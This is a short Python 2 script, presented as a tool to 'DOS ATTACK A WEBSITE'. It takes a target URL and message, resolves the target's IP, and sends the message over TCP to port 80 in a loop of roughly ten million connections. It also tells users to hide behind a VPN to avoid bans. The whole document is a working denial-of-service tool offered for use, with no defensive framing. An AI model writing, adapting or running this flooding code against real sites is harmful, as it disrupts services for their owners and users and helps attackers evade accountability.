## -*- coding: utf-8 -*-import time
import socket
import os
import sys
import string
import random
os.system('clear')
print("\033[94m[✘] \033[97minstalling the \033[91mpackage \033[97m, Please wait :")
os.system('apt-get install espeak')
os.system('clear')


print("\033[0;37;41m DOS ATTACK A WEBSITE  \n")
print ("\030[1;32;40m script by ORIGINALABHAY \n")
print ("ALWAYS USE VPN TO PROTECT YOURSELF FROM IP BAN")
host=raw_input( "\033[94m[?] \033[97mURL\033[91m Target\033[97m :\033[93m " )
message=raw_input( "\033[94m[?]\033[97m Your \033[91mMessage \033[97m:\033[93m  " )
#this is to get The ip of the URL (Website)
ip = socket.gethostbyname( host )
print ("\033[94m[✔]\033[97m The \033[91mTarget\033[97m Ip : [\033[92m" + ip + "\033[97m]")
print(" ")
os.system('espeak  Start-The-Attack-to-'+host)
os.system('clear')
print ("\033[94m[✔] \033[97mStart The \033[97mAttack\033[97m :")
print(" ")
def hack():
    vegeta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        vegeta.connect((host, 80))
        vegeta.send( message )
        vegeta.sendto( message, (ip, 80) )
        vegeta.send( message );
    except socket.error, msg:
        print("\033[94m[✘]\033[96m Error , Connection Failed")
    print ("\033[94m [✔]\033[92m Sent \033[97m : \033[91m "+  message)
    vegeta.close()
for i in range(1, 9999999):
    hack()
print ("Done")


        
